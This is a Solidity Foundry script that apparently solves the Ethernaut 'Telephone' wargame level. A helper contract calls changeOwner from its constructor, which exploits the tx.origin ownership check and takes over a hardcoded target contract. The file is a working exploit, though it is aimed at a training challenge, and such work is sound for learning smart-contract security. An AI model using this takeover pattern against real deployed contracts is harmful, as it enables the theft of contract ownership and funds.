// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackContract {
    constructor(Telephone _telephone, address _myAddress) {
        _telephone.changeOwner(_myAddress);
    }
}

contract TelephoneSolution is Script {

    address target = 0x98445dD54C690689D5b9a7417dA32aEF00D4eb51;
    Telephone telephone = Telephone(target);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address myAddress = vm.envAddress("MY_ADDRESS");
        new AttackContract(telephone, myAddress);
        assert(telephone.owner() == myAddress);

        vm.stopBroadcast();
    }
}